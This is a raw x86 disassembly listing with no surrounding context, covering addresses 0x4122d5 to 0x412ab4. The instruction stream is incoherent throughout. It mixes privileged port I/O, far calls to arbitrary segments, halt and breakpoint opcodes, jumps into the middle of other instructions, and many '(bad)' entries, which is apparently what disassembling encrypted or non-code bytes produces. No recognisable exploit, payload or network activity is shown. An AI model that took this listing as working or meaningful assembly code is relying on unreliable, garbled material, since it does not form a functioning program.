  4122d5:	das    
  4122d6:	sar    BYTE PTR [edi-0x63],0xf6
  4122da:	jmp    0x35b2f7b4
  4122df:	mov    eax,edi
  4122e1:	cmp    DWORD PTR [esi-0x8],esp
  4122e4:	fs mov al,0xf
  4122e7:	jmp    FWORD PTR [ecx-0x19]
  4122ea:	jo     0x412312
  4122ec:	imul   esp,DWORD PTR [esi],0x69
  4122ef:	mov    ebp,0x4ce0716f
  4122f4:	in     al,dx
  4122f5:	jg     0x4122c6
  4122f7:	pop    esp
  4122f8:	fcmovu st,st(0)
  4122fa:	dec    ecx
  4122fb:	mov    WORD PTR [ebx+eiz*2-0x39],fs
  4122ff:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412301:	ss addr16 jl 0x4122d3
  412305:	std    
  412306:	out    dx,al
  412307:	push   0xffffff8e
  412309:	mov    esp,0x136941a9
  41230e:	xor    ebx,esi
  412310:	jle    0x412320
  412312:	mov    bl,0xb2
  412314:	lods   eax,DWORD PTR ds:[esi]
  412315:	out    dx,al
  412316:	jae    0x4122d7
  412318:	scas   al,BYTE PTR es:[edi]
  412319:	or     DWORD PTR [edx],0x2ceb2266
  41231f:	daa    
  412320:	shl    BYTE PTR [edx+ecx*4],1
  412323:	jno    0x4122e9
  412325:	mov    edi,0x9e6d7214
  41232a:	mov    BYTE PTR [edx-0x22c7d8ea],cl
  412330:	fsubr  DWORD PTR [ebx]
  412332:	mov    edi,0x7f731a27
  412337:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412338:	mov    al,ds:0xf6910cae
  41233d:	icebp  
  41233e:	imul   eax,DWORD PTR [edi+esi*2+0x4fff4764],0xb9565995
  412349:	ss or  edi,esi
  41234c:	cs ss stc 
  41234f:	outs   dx,BYTE PTR ds:[esi]
  412350:	call   0x6419:0x4b67a4ea
  412357:	xor    ebx,DWORD PTR ds:0xf081fe84
  41235d:	xor    al,0x7b
  41235f:	sbb    dh,dl
  412361:	in     al,dx
  412362:	and    DWORD PTR [ecx+0x1a53cded],0x9c5ca1ca
  41236c:	aad    0xd0
  41236e:	shl    DWORD PTR [eax+0x5c],0xc9
  412372:	dec    eax
  412373:	and    dl,BYTE PTR [edi]
  412375:	pop    edx
  412376:	dec    esp
  412377:	imul   edx,DWORD PTR [eax-0x329ea3e4],0xc1d1acee
  412381:	jle    0x4123ef
  412383:	pop    DWORD PTR [ebp+0x683369d9]
  412389:	stc    
  41238a:	cmc    
  41238b:	jle    0x4123bd
  41238d:	stc    
  41238e:	xor    DWORD PTR [ebp+0x20f09b02],esi
  412394:	sbb    BYTE PTR [eax+0x75],ah
  412397:	push   eax
  412398:	and    eax,0xec028505
  41239d:	enter  0xb8ba,0x48
  4123a1:	sbb    dl,ch
  4123a3:	mov    dh,BYTE PTR [esp+ecx*1-0x2c691a71]
  4123aa:	cmp    DWORD PTR [ecx-0x4],ebx
  4123ad:	leave  
  4123ae:	pusha  
  4123af:	mov    esi,0x19118dc
  4123b4:	loope  0x4123e7
  4123b6:	adc    al,0x7d
  4123b8:	cwde   
  4123b9:	bound  ecx,QWORD PTR [ecx]
  4123bb:	rcl    BYTE PTR [edx+0x4174f708],cl
  4123c1:	adc    DWORD PTR [ecx-0x4c],ebp
  4123c4:	in     eax,0xe4
  4123c6:	adc    dl,BYTE PTR [eax]
  4123c8:	mov    WORD PTR [ecx+edx*1],?
  4123cb:	mov    ch,0xcb
  4123cd:	push   ebp
  4123ce:	adc    DWORD PTR [edi-0x5e62c9e2],0x16ae7a43
  4123d8:	iret   
  4123d9:	in     al,dx
  4123da:	dec    esi
  4123db:	sub    DWORD PTR [ebx+0x513d1a34],ebp
  4123e1:	jg     0x4123b5
  4123e3:	jb     0x41241b
  4123e5:	icebp  
  4123e6:	adc    edx,eax
  4123e8:	adc    DWORD PTR ds:0x7e297310,0x75
  4123ef:	das    
  4123f0:	mov    es,edx
  4123f2:	mov    BYTE PTR [ecx],bh
  4123f4:	adc    eax,0x1678b565
  4123f9:	mov    ds:0x87b58a37,eax
  4123fe:	and    ch,BYTE PTR [eax-0x71717055]
  412404:	jmp    FWORD PTR [ecx+ebx*4-0x72]
  412408:	daa    
  412409:	ja     0x4123d3
  41240b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41240c:	push   eax
  41240d:	mov    ds:0xdec4e80c,eax
  412412:	jge    0x41240b
  412414:	jbe    0x4123f3
  412416:	and    DWORD PTR [ecx-0x7f],ebp
  412419:	mov    ch,0x87
  41241b:	cld    
  41241c:	in     eax,dx
  41241d:	mov    edx,0xb9a7f4a5
  412422:	mov    cl,0x34
  412424:	out    0xc1,al
  412426:	(bad)  
  412427:	xlat   BYTE PTR ds:[ebx]
  412428:	push   esi
  412429:	stc    
  41242a:	mov    ecx,0x87f23c07
  41242f:	in     eax,0xd9
  412431:	sbb    ch,dh
  412433:	sbb    eax,0x7deb5d33
  412438:	mov    al,ds:0x52116351
  41243d:	pop    ebx
  41243e:	push   cs
  41243f:	aad    0x9f
  412441:	jne    0x4124ab
  412443:	ret    
  412444:	retf   
  412445:	cmp    al,0xfc
  412447:	lods   eax,DWORD PTR ds:[esi]
  412448:	jp     0x4123db
  41244a:	(bad)  
  41244b:	mov    esp,0xdfe406d
  412450:	push   0xbece022d
  412455:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412456:	in     al,dx
  412457:	scas   eax,DWORD PTR es:[edi]
  412458:	xlat   BYTE PTR ds:[ebx]
  412459:	sbb    eax,0x3d4d1dcb
  41245e:	lds    ebp,FWORD PTR [eax]
  412460:	mov    bl,0x7b
  412462:	jge    0x412425
  412464:	in     al,0x23
  412466:	in     eax,0xb3
  412468:	pop    ebx
  412469:	adc    edx,eax
  41246b:	mov    edi,es
  41246d:	push   ss
  41246e:	jl     0x4124c2
  412470:	loope  0x412440
  412472:	add    DWORD PTR [edi+0x9],esp
  412475:	pop    ebp
  412476:	mov    BYTE PTR [eax+0x146cdeff],al
  41247c:	test   eax,0x7437a3d9
  412481:	xchg   ebx,eax
  412482:	lock xor esi,DWORD PTR [edx+0x53]
  412486:	xor    dl,BYTE PTR [edi]
  412488:	push   ecx
  412489:	pop    ds
  41248a:	loopne 0x41242a
  41248c:	lock sbb eax,0xad7ecbef
  412492:	shr    DWORD PTR [ebx+0x7ea8b4a9],0x2
  412499:	pop    ecx
  41249a:	std    
  41249b:	pusha  
  41249c:	outs   dx,BYTE PTR ds:[esi]
  41249d:	fild   QWORD PTR [esi+0x1ca81251]
  4124a3:	and    bh,dh
  4124a5:	lea    ebx,[ebx]
  4124a7:	in     al,dx
  4124a8:	pop    ss
  4124a9:	xor    BYTE PTR [edi-0x4cbcc5cb],al
  4124af:	out    dx,al
  4124b0:	mov    esp,0x7ddb51b1
  4124b5:	fwait
  4124b6:	popf   
  4124b7:	test   DWORD PTR [eax],ebx
  4124b9:	mov    ebx,0x22dd3e55
  4124be:	jmp    0x2532419d
  4124c3:	aas    
  4124c4:	jns    0x41250b
  4124c6:	mov    bh,0xba
  4124c8:	in     eax,dx
  4124c9:	push   edi
  4124ca:	cmp    BYTE PTR [esi-0x13b44faa],0x68
  4124d1:	pop    edx
  4124d2:	lea    ecx,[eax+0x55]
  4124d5:	push   0xffffffd1
  4124d7:	cld    
  4124d8:	mov    edi,edi
  4124da:	(bad)  [eax]
  4124dc:	mov    ah,0x6c
  4124de:	fidivr WORD PTR [eax-0x1880e771]
  4124e4:	cmp    BYTE PTR [edi+edx*1-0x3be9c606],dh
  4124eb:	inc    eax
  4124ec:	mov    edi,0x67634735
  4124f1:	jmp    0xb7fd1d62
  4124f6:	stos   DWORD PTR es:[edi],eax
  4124f7:	add    cl,BYTE PTR [ebp*8+0x5f1e179f]
  4124fe:	add    edi,ecx
  412500:	push   cs
  412501:	inc    esi
  412502:	pop    ecx
  412503:	jo     0x412490
  412505:	add    eax,0xc15bc907
  41250a:	jne    0x41253c
  41250c:	inc    esi
  41250d:	mov    ebx,0x3323bf1c
  412512:	or     ch,ah
  412514:	or     DWORD PTR [eax],ebx
  412516:	cwde   
  412517:	jns    0x4124ac
  412519:	aas    
  41251a:	mov    ebx,0xcf994b76
  41251f:	mov    ebx,DWORD PTR [edx-0x17915cf8]
  412525:	and    DWORD PTR [esi-0x71],edx
  412528:	inc    eax
  412529:	adc    dh,BYTE PTR [ecx]
  41252b:	lods   eax,DWORD PTR ds:[esi]
  41252c:	pop    edx
  41252d:	pusha  
  41252e:	xchg   esp,eax
  41252f:	stc    
  412530:	sub    al,0x85
  412532:	lock inc esi
  412534:	cmp    ebx,ebp
  412536:	mov    cl,cl
  412538:	mov    dh,0x72
  41253a:	hlt    
  41253b:	cdq    
  41253c:	add    al,0x91
  41253e:	stc    
  41253f:	inc    ebx
  412540:	ja     0x412551
  412542:	std    
  412543:	ret    0x8feb
  412546:	adc    BYTE PTR [ecx+0x55b4f6f0],dl
  41254c:	cmp    ebp,0xefb3aeb0
  412552:	stos   DWORD PTR es:[edi],eax
  412553:	and    eax,0xd3327302
  412558:	pop    ebx
  412559:	xor    DWORD PTR [edi+ebp*1-0x46],esi
  41255d:	mov    ebx,esp
  41255f:	dec    ecx
  412560:	or     eax,0x7ddf8bf2
  412565:	and    DWORD PTR [ebx],esp
  412567:	adc    bl,BYTE PTR ds:0xad1ba58e
  41256d:	cmp    edx,DWORD PTR [ecx]
  41256f:	pop    eax
  412570:	scas   al,BYTE PTR es:[edi]
  412571:	or     BYTE PTR [eax+ebx*1-0x4c0fa856],al
  412578:	adc    eax,0x79bfbbf
  41257d:	adc    DWORD PTR [edx-0x15],esp
  412580:	addr16 push cs
  412582:	aam    0xb
  412584:	arpl   WORD PTR [ebx],si
  412586:	xor    al,0xa9
  412588:	or     dh,bh
  41258a:	fisttp WORD PTR [ecx-0x7]
  41258d:	loope  0x4125b2
  41258f:	mov    esp,0xd0c7878d
  412594:	xor    ah,BYTE PTR [eax]
  412596:	or     DWORD PTR [ebp+0x6d4e37c5],edx
  41259c:	push   ebx
  41259d:	and    bh,BYTE PTR [edi]
  41259f:	pop    ecx
  4125a0:	inc    ecx
  4125a1:	fisub  DWORD PTR [edi-0x6d70d914]
  4125a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125a8:	push   ds
  4125a9:	jle    0x412592
  4125ab:	(bad)  
  4125ac:	mov    DWORD PTR [ebp+0x47bb136c],esp
  4125b2:	push   ss
  4125b3:	out    0xff,al
  4125b5:	sub    dh,0x58
  4125b8:	lds    ebx,FWORD PTR [edi+0x76c02d26]
  4125be:	retf   0xe3a6
  4125c1:	pop    eax
  4125c2:	fiadd  WORD PTR [edi]
  4125c4:	xor    dh,0x1c
  4125c7:	mov    dh,0x4
  4125c9:	add    eax,0xeebfee86
  4125ce:	mov    ds:0x9cae2003,al
  4125d3:	sbb    BYTE PTR [ebp+0x1b9258f7],dh
  4125d9:	and    al,0xad
  4125db:	adc    bl,BYTE PTR [edx+ecx*4]
  4125de:	push   edi
  4125df:	xchg   ebp,eax
  4125e0:	cmp    DWORD PTR [ecx+0x605eef7],ebx
  4125e6:	jmp    0x4125e4
  4125e8:	dec    ebp
  4125e9:	mov    ah,0xd7
  4125eb:	mov    bl,0xff
  4125ed:	xor    al,0xe4
  4125ef:	les    ebp,FWORD PTR cs:[esi]
  4125f2:	je     0x4125d6
  4125f4:	sbb    dh,dl
  4125f6:	jno    0x4125c3
  4125f8:	popf   
  4125f9:	dec    esp
  4125fa:	mov    esp,0x680b3066
  4125ff:	arpl   WORD PTR [edi],si
  412601:	aam    0xbd
  412603:	or     eax,0x7dcc6ca5
  412608:	jl     0x41261f
  41260a:	das    
  41260b:	dec    ebx
  41260c:	xchg   esi,eax
  41260d:	inc    ebp
  41260e:	arpl   WORD PTR [esi-0x3f],bx
  412611:	inc    esi
  412612:	sub    BYTE PTR [esi+0x34],dh
  412615:	int3   
  412616:	retf   0xa7d2
  412619:	sahf   
  41261a:	ss jg  0x412648
  41261d:	out    dx,al
  41261e:	mov    bh,0x5b
  412620:	aaa    
  412621:	push   ecx
  412622:	imul   edx,DWORD PTR [edi-0x4e],0xffffffe6
  412626:	xlat   BYTE PTR ds:[ebx]
  412627:	ret    0x7308
  41262a:	aam    0xef
  41262c:	dec    esi
  41262d:	lahf   
  41262e:	inc    ebx
  41262f:	mov    ds:0xe17aa69a,al
  412634:	cld    
  412635:	xchg   ecx,eax
  412636:	add    ebp,ecx
  412638:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412639:	lods   eax,DWORD PTR ds:[esi]
  41263a:	push   0x43
  41263c:	popf   
  41263d:	shr    BYTE PTR [edx],cl
  41263f:	scas   eax,DWORD PTR es:[edi]
  412640:	push   ss
  412641:	femms  
  412643:	and    al,0x10
  412645:	push   eax
  412646:	and    ebx,DWORD PTR [ebx]
  412648:	out    0xf0,eax
  41264a:	fcmovb st,st(2)
  41264c:	test   al,0x7b
  41264e:	dec    edi
  41264f:	cmp    DWORD PTR [edi+eiz*2+0x76],ecx
  412653:	loope  0x412671
  412655:	inc    ecx
  412656:	in     al,dx
  412657:	outs   dx,BYTE PTR ds:[esi]
  412658:	and    ch,BYTE PTR [ebx]
  41265a:	push   edx
  41265b:	scas   al,BYTE PTR es:[edi]
  41265c:	push   edx
  41265d:	dec    ebp
  41265e:	jp     0x412654
  412660:	jge    0x4126c5
  412662:	push   eax
  412663:	(bad)  
  412664:	jle    0x4125f1
  412666:	mov    bl,0xb7
  412668:	cmp    al,0x53
  41266a:	pop    ds
  41266b:	sub    eax,0xbb4bd11
  412670:	jmp    0x4126bc
  412672:	jb     0x412680
  412674:	ja     0x41260f
  412676:	(bad)  
  412677:	mov    ebx,0xd099f427
  41267c:	or     al,0x25
  41267e:	aaa    
  41267f:	lock mov ah,0x14
  412682:	jg     0x41261e
  412684:	into   
  412685:	das    
  412686:	push   cs
  412687:	fst    DWORD PTR [ecx-0x3c8d1dbd]
  41268d:	jae    0x4126c8
  41268f:	adc    al,0x72
  412691:	daa    
  412692:	dec    esp
  412693:	inc    eax
  412694:	jp     0x412689
  412696:	imul   esp,DWORD PTR [esi-0x51],0x25b30e6d
  41269d:	lock mov esp,0x91bf0108
  4126a3:	fcomi  st,st(4)
  4126a5:	imul   esi,DWORD PTR [eax+0x69a8de55],0xcbb570af
  4126af:	lods   eax,DWORD PTR ds:[esi]
  4126b0:	cld    
  4126b1:	mov    edi,0x42fbbeae
  4126b6:	add    eax,0xa32ca8e6
  4126bb:	mov    DWORD PTR [ebx+0xe],eax
  4126be:	call   0x2276495
  4126c3:	enter  0x42aa,0xa7
  4126c7:	cdq    
  4126c8:	cwde   
  4126c9:	jle    0x412744
  4126cb:	push   ds
  4126cc:	stc    
  4126cd:	cmc    
  4126ce:	sub    eax,DWORD PTR [edx]
  4126d0:	mov    cl,0xb1
  4126d2:	(bad)  [esi-0x22]
  4126d5:	test   BYTE PTR [ebx-0x7],0xe2
  4126d9:	xchg   ebp,eax
  4126da:	push   ds
  4126db:	dec    esi
  4126dc:	aas    
  4126dd:	mul    DWORD PTR [ebx+0x4c]
  4126e0:	jmp    0x412681
  4126e2:	inc    ecx
  4126e3:	inc    eax
  4126e4:	leave  
  4126e5:	sbb    eax,0x46e33e18
  4126ea:	outs   dx,BYTE PTR ds:[esi]
  4126eb:	rep ins DWORD PTR es:[edi],dx
  4126ed:	lock jge 0x41276a
  4126f0:	push   ss
  4126f1:	dec    ebp
  4126f2:	shr    BYTE PTR [ecx+0x3b],0xa8
  4126f6:	mov    ecx,0xe487b751
  4126fb:	sahf   
  4126fc:	sbb    eax,0x28365a12
  412701:	(bad)  
  412702:	cli    
  412703:	pop    ebx
  412704:	dec    edi
  412705:	loopne 0x412746
  412707:	pop    ebx
  412708:	pusha  
  412709:	ss pop ss
  41270b:	hlt    
  41270c:	mov    WORD PTR [ebx-0x60],es
  41270f:	mov    ds:0xd3a31404,al
  412714:	jmp    0x9bcf6c49
  412719:	scas   al,BYTE PTR es:[edi]
  41271a:	push   eax
  41271b:	ds int3 
  41271d:	jae    0x41270a
  41271f:	dec    esi
  412720:	pop    ebp
  412721:	xor    al,0xd0
  412723:	or     DWORD PTR [esi+0x20ef7600],ebx
  412729:	jg     0x4127a2
  41272b:	rcr    dl,0x99
  41272e:	fnsave [ebx-0x57]
  412731:	jae    0x412769
  412733:	stc    
  412734:	pop    ss
  412735:	jne    0x41273f
  412737:	fsubr  DWORD PTR [ebp-0x4f]
  41273a:	push   esp
  41273b:	push   esi
  41273c:	je     0x4127b7
  41273e:	and    DWORD PTR [eax-0x3a],0xffffffdb
  412742:	repnz mov eax,0x708a1bbe
  412748:	data16 cmp bl,0x9f
  41274c:	dec    ebp
  41274d:	xlat   BYTE PTR ds:[ebx]
  41274e:	push   edx
  41274f:	loop   0x4126e0
  412751:	scas   eax,DWORD PTR es:[edi]
  412752:	call   0x2427:0x6d993f95
  412759:	xchg   esp,eax
  41275a:	and    eax,ebx
  41275c:	loopne 0x412778
  41275e:	jle    0x412762
  412760:	mov    ebp,0x68d323f
  412765:	xor    ebx,eax
  412767:	shl    ah,0xf7
  41276a:	or     ch,BYTE PTR [ebx+edi*4+0x37d96e3b]
  412771:	push   ebx
  412772:	xor    DWORD PTR [eax+0x6e],0xf02c048a
  412779:	enter  0x216c,0x6
  41277d:	push   cs
  41277e:	mov    ds,WORD PTR [eax+eax*1]
  412781:	adc    ebx,DWORD PTR [ebx-0x9b7a58]
  412787:	and    al,0x2a
  412789:	pop    esi
  41278a:	loopne 0x41271c
  41278c:	pop    ds
  41278d:	sub    bh,dh
  41278f:	dec    edi
  412790:	or     dl,BYTE PTR [edx+0x72]
  412793:	(bad)  
  412794:	fs push cs
  412796:	pop    eax
  412797:	push   eax
  412798:	ret    0x6981
  41279b:	out    0x4a,al
  41279d:	scas   eax,DWORD PTR es:[edi]
  41279e:	push   ss
  41279f:	sub    DWORD PTR [edi+0x680b3c74],esi
  4127a5:	pop    esp
  4127a6:	dec    ebx
  4127a7:	pop    esp
  4127a8:	test   al,0xa6
  4127aa:	jnp    0x412764
  4127ac:	int    0x5b
  4127ae:	and    bl,BYTE PTR [ebp-0x768a57e4]
  4127b4:	test   DWORD PTR [ebx],ecx
  4127b6:	push   es
  4127b7:	in     eax,0x9a
  4127b9:	adc    eax,0x6d7c6da6
  4127be:	imul   ax,WORD PTR ds:[esi-0x24],0xb6d8
  4127c5:	into   
  4127c6:	inc    esi
  4127c7:	lds    ebx,FWORD PTR [edi+0x74]
  4127ca:	retf   0xa18c
  4127cd:	fstp   QWORD PTR [ebx+0x11633190]
  4127d3:	push   esp
  4127d4:	fs arpl di,sp
  4127d7:	and    al,0xbb
  4127d9:	fsubr  DWORD PTR [ebp-0x751746a3]
  4127df:	into   
  4127e0:	xlat   BYTE PTR ds:[ebx]
  4127e1:	mov    dl,0x1e
  4127e3:	(bad)  [edx+0x9]
  4127e6:	push   edi
  4127e7:	xor    DWORD PTR ds:0xb9037b6,esi
  4127ed:	mov    dh,0x87
  4127ef:	test   dh,al
  4127f1:	push   ss
  4127f2:	in     al,0x3e
  4127f4:	inc    eax
  4127f5:	pop    ecx
  4127f6:	ds jnp 0x4127e4
  4127f9:	jp     0x41285c
  4127fb:	push   0x7d1f937
  412800:	jge    0x4127b0
  412802:	add    ecx,ebp
  412804:	pop    esp
  412805:	or     eax,0xec158b9b
  41280a:	jp     0x4127c6
  41280c:	inc    ebx
  41280d:	int    0x97
  41280f:	cmp    eax,DWORD PTR [edx+0x2a33fc4a]
  412815:	xchg   ebp,eax
  412816:	lods   al,BYTE PTR ds:[esi]
  412817:	xor    eax,0xa4321e6a
  41281c:	mov    al,ds:0x4ed5dd5a
  412821:	out    dx,al
  412822:	xchg   ecx,eax
  412823:	jae    0x41289b
  412825:	pop    ebp
  412826:	ss sbb al,0xb4
  412829:	xchg   ebp,eax
  41282a:	shl    ebx,cl
  41282c:	or     BYTE PTR [ebx+0x3b6e503e],cl
  412832:	aam    0xcf
  412834:	sub    eax,0x7ff4fbce
  412839:	hlt    
  41283a:	push   esp
  41283b:	fdivr  st,st(4)
  41283d:	pop    es
  41283e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41283f:	inc    edi
  412840:	inc    esp
  412841:	ja     0x41288c
  412843:	push   es
  412844:	out    dx,eax
  412845:	daa    
  412846:	mov    dl,0xc9
  412848:	mov    dl,BYTE PTR [esi-0x767c689e]
  41284e:	push   esp
  41284f:	xlat   BYTE PTR ds:[ebx]
  412850:	adc    eax,0xf23b5ce6
  412855:	jge    0x4128d6
  412857:	scas   eax,DWORD PTR es:[edi]
  412858:	arpl   WORD PTR [edi-0x2da9b98b],sp
  41285e:	imul   esi,DWORD PTR [eax+eax*1-0x4e],0x27
  412863:	pusha  
  412864:	packuswb mm6,QWORD PTR [ebx-0x51]
  412868:	popa   
  412869:	inc    edx
  41286a:	mov    esi,0x53fb5038
  41286f:	aas    
  412870:	popf   
  412871:	cmp    DWORD PTR [edx],ecx
  412873:	xchg   esp,eax
  412874:	dec    edx
  412875:	test   BYTE PTR [ebx+0x68],bh
  412878:	pop    esi
  412879:	sahf   
  41287a:	push   esp
  41287b:	idiv   BYTE PTR [esi+0x2a]
  41287e:	sub    al,0x93
  412880:	pop    ss
  412881:	gs mov eax,0x637bc336
  412887:	add    BYTE PTR [ebp-0x2f4675e4],ah
  41288d:	jmp    0x41283e
  41288f:	cld    
  412890:	mov    eax,ds:0x69248edf
  412895:	hlt    
  412896:	adc    BYTE PTR [ecx-0x45],al
  412899:	xchg   esi,eax
  41289a:	sub    bh,BYTE PTR [eax-0x4328074f]
  4128a0:	jne    0x412850
  4128a2:	outs   dx,DWORD PTR ds:[esi]
  4128a3:	loopne 0x41283a
  4128a5:	jno    0x4128cd
  4128a7:	sub    ebx,eax
  4128a9:	push   ebp
  4128ab:	dec    ecx
  4128ac:	push   ss
  4128ad:	cld    
  4128ae:	(bad)  
  4128af:	pop    edi
  4128b0:	pop    es
  4128b1:	mov    dh,0x77
  4128b3:	add    eax,0x916ab2b
  4128b8:	mov    bh,0x96
  4128ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128bb:	(bad)  
  4128bc:	popa   
  4128bd:	adc    al,0x5b
  4128bf:	in     al,dx
  4128c0:	cmc    
  4128c1:	sahf   
  4128c2:	sar    BYTE PTR [ebx+ebx*2],0xcb
  4128c6:	cs test eax,0x15b780b2
  4128cc:	xor    eax,0x8987a5d4
  4128d1:	enter  0x66f1,0x88
  4128d5:	jo     0x412951
  4128d7:	mov    dl,0x3
  4128d9:	das    
  4128da:	sti    
  4128db:	test   DWORD PTR [edi],esp
  4128dd:	mov    dh,BYTE PTR [edi-0x2e]
  4128e0:	ret    0xad39
  4128e3:	or     al,0x8
  4128e5:	and    ebp,ebx
  4128e7:	adc    DWORD PTR [ecx-0x6d72184],edx
  4128ed:	push   ecx
  4128ee:	push   ecx
  4128ef:	ja     0x412879
  4128f1:	cmp    esp,ebx
  4128f3:	push   ss
  4128f4:	push   ss
  4128f5:	popa   
  4128f6:	repnz out dx,al
  4128f8:	mov    ecx,DWORD PTR gs:[esi+0x38]
  4128fc:	and    DWORD PTR [esi+0x11],ecx
  4128ff:	inc    edi
  412900:	retf   
  412901:	les    edx,FWORD PTR [ecx+0x2568f51c]
  412907:	pop    esp
  412908:	mov    al,ds:0x7b67e072
  41290d:	clc    
  41290e:	and    ecx,esi
  412910:	xor    ebx,DWORD PTR [eax]
  412912:	sbb    al,0xf6
  412914:	into   
  412915:	ret    
  412916:	push   0xc580c7b1
  41291b:	mov    DWORD PTR [eax+0x69],edx
  41291e:	adc    eax,0xd3eb5918
  412923:	sub    al,0x6a
  412925:	sbb    eax,0xfffffffc
  412928:	cli    
  412929:	(bad)  
  41292a:	cmp    ch,BYTE PTR [edi-0x5ce1ea0]
  412930:	add    esi,ecx
  412932:	adc    al,0xca
  412934:	mov    DWORD PTR [edx-0x1ce7e20a],edx
  41293a:	in     eax,0xa0
  41293c:	mov    ebp,0xa966407b
  412941:	fidivr WORD PTR [ebp-0x47]
  412944:	in     eax,dx
  412945:	adc    ah,BYTE PTR [ebx+edx*8]
  412948:	arpl   WORD PTR [ebx],cx
  41294a:	pop    ebp
  41294b:	(bad)  
  41294c:	je     0x4129c3
  41294e:	inc    ebp
  41294f:	sub    eax,0xbc37b54e
  412954:	(bad)  
  412955:	cdq    
  412956:	and    esp,DWORD PTR [eax-0x422cdd28]
  41295c:	jbe    0x4129c7
  41295e:	pop    es
  41295f:	jecxz  0x4128e2
  412961:	push   esi
  412962:	add    BYTE PTR [eax],ch
  412964:	cmp    BYTE PTR [edx+0x6d387f8d],cl
  41296a:	ss clc 
  41296c:	cdq    
  41296d:	adc    bl,BYTE PTR [eax+0x6b4b7d55]
  412973:	fimul  WORD PTR [ebx-0x15]
  412976:	sub    eax,0xfcb06790
  41297b:	or     esi,DWORD PTR [edi-0x43]
  41297e:	hlt    
  41297f:	xor    edx,DWORD PTR [ebp+0x79]
  412982:	adc    ah,al
  412984:	fs sub al,0xe
  412987:	(bad)
  41298a:	xor    ebp,DWORD PTR [ebx+0x5a2d0247]
  412990:	sbb    BYTE PTR [esi],ch
  412992:	cmp    edi,DWORD PTR [esi+edx*8]
  412995:	ret    0x197e
  412998:	test   al,0xd5
  41299a:	cmp    cl,dl
  41299c:	(bad)  
  41299d:	stc    
  41299e:	jb     0x4129a1
  4129a0:	retf   0x1e9f
  4129a3:	test   BYTE PTR [edx],0xe4
  4129a6:	ja     0x4129ab
  4129a8:	aas    
  4129a9:	stos   DWORD PTR es:[edi],eax
  4129aa:	pusha  
  4129ab:	std    
  4129ac:	pop    ebx
  4129ad:	pop    edi
  4129ae:	int    0x3b
  4129b0:	sbb    al,0xb2
  4129b2:	fldcw  WORD PTR [edx+0x7af61778]
  4129b8:	mov    al,0x49
  4129ba:	xor    bh,BYTE PTR [edi+eax*2+0x4141b3f5]
  4129c1:	loope  0x41298f
  4129c3:	nop
  4129c4:	adc    eax,0x465ea940
  4129c9:	jmp    0x879dc00d
  4129ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129cf:	mov    ecx,0x91a8ff0a
  4129d4:	fs shl edi,cl
  4129d7:	inc    esi
  4129d8:	or     al,BYTE PTR [esi-0x6e477200]
  4129de:	mov    ah,0xb7
  4129e0:	dec    esi
  4129e1:	iret   
  4129e2:	jb     0x41299c
  4129e4:	cmp    BYTE PTR [edi],0x73
  4129e7:	shl    BYTE PTR [edi],0x97
  4129ea:	mov    ah,0x44
  4129ec:	cmc    
  4129ed:	xor    BYTE PTR [ebx+0x3a],ch
  4129f0:	neg    ah
  4129f2:	(bad)  [esi-0x60]
  4129f5:	jne    0x4129ee
  4129f7:	(bad)  
  4129f8:	xchg   edi,eax
  4129f9:	sbb    BYTE PTR [edx],dh
  4129fb:	and    ecx,0x51c91f6a
  412a01:	mov    DWORD PTR [edi+0x276c645d],eax
  412a07:	bound  ebp,QWORD PTR [edx]
  412a09:	adc    eax,0x27593b31
  412a0e:	jne    0x4129e0
  412a10:	and    bh,BYTE PTR [edi+0x7dd16a5]
  412a16:	int    0x7f
  412a18:	cmp    esi,DWORD PTR [esi-0x30]
  412a1b:	dec    edx
  412a1c:	aaa    
  412a1d:	pop    ebx
  412a1e:	js     0x412a3a
  412a20:	cmp    bl,BYTE PTR [edx]
  412a22:	or     eax,ebp
  412a24:	pusha  
  412a25:	sub    al,0xc9
  412a27:	ror    BYTE PTR [edx+0x62045bbd],1
  412a2d:	dec    esi
  412a2e:	jmp    0xfab30da3
  412a33:	idiv   ch
  412a35:	scas   al,BYTE PTR es:[edi]
  412a36:	fld    QWORD PTR [ebp-0x5fdbe740]
  412a3c:	xchg   ecx,eax
  412a3d:	sub    DWORD PTR [eax],ebp
  412a3f:	gs dec ecx
  412a41:	fwait
  412a42:	cwde   
  412a43:	mov    ah,0x9b
  412a45:	enter  0xdeba,0x58
  412a49:	rcl    DWORD PTR [ecx+ebx*8],cl
  412a4c:	in     al,0xf8
  412a4e:	iret   
  412a4f:	test   al,0x4c
  412a51:	inc    esp
  412a52:	jge    0x4129e7
  412a54:	(bad)  
  412a55:	loopne 0x412a1b
  412a57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a58:	mov    ds:0xfa5257ac,al
  412a5d:	test   al,0xa
  412a5f:	dec    ecx
  412a60:	inc    esp
  412a61:	mov    BYTE PTR [edx+0x66783857],ah
  412a67:	pop    esp
  412a68:	jecxz  0x412a02
  412a6a:	bound  ebx,QWORD PTR [edx-0x2a]
  412a6d:	jmp    0x4129f7
  412a6f:	aam    0xc7
  412a71:	xlat   BYTE PTR ds:[bx]
  412a73:	jmp    0x1b807148
  412a78:	xchg   ebp,eax
  412a79:	ret    0x4e74
  412a7c:	and    esp,DWORD PTR [ebx-0x1f]
  412a7f:	mov    ah,0x28
  412a81:	int    0xb5
  412a83:	fadd   st(4),st
  412a85:	sub    bh,BYTE PTR [ebp+ecx*8+0x1]
  412a89:	cld    
  412a8a:	jle    0x412a6b
  412a8c:	ret    0x3bf1
  412a8f:	je     0x412b02
  412a91:	mov    ds:0x811a6735,eax
  412a96:	jge    0x412a61
  412a98:	mov    al,ds:0x6f6a3ac3
  412a9d:	js     0x412aad
  412a9f:	dec    edi
  412aa0:	loopne 0x412a5b
  412aa2:	xchg   ebx,eax
  412aa3:	test   ecx,0x1ce7edde
  412aa9:	sar    BYTE PTR [esi],1
  412aab:	aas    
  412aac:	mov    ah,0x97
  412aae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412aaf:	mov    bl,0xdf
  412ab1:	loope  0x412ad5
  412ab3:	in     al,dx
  412ab4:	add    eax,0x88ee0f97
